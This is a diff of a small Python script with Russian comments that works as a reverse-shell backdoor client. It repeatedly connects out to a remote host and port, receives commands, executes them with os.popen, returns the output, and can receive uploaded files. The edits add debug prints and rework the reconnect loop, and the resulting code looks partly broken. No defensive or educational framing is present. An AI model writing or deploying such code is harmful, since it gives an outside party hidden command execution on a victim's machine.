@@ -2,9 +2,6 @@ import socket
 import os
 import time
 
-sock = socket.socket()
-sock.connect(("192.168.1.47", 10000))
-
 def recvfile():
     i = 1
     f = open(sock.recv(1024), 'wb')  # Open in binary
@@ -15,16 +12,15 @@ def recvfile():
         while (l):
             f.write(l)
             l = sock.recv(1024)
+ 
 def main():
-    while True:
-        try:
-            sock = socket.socket()
-            sock.connect(("0.0.0.0", 9898))
             while True:
                 try:
+                    print("1")
                     data = sock.recv(1024).decode()  # получаем команду
                     if data == "uploadfile":
-                        recvfile()
+                        print("ok")
+                        break
                     else:
                         continue
                     aa = os.popen(data)
@@ -36,7 +32,18 @@ def main():
                         sock.send(result.encode())  # отправляем результат
                 except:
                     break
-        except:
-            time.sleep(10)
-            continue
-main()
+ 
+            
+while True:
+	try:
+	    print("trying...")
+	    sock.connect(("0.0.0.0", 1440))
+	except:
+		print("excepted")
+		sock = socket.socket()
+		time.sleep(10)
+		continue
+	else:
+		print("connected")
+		main()
+		break
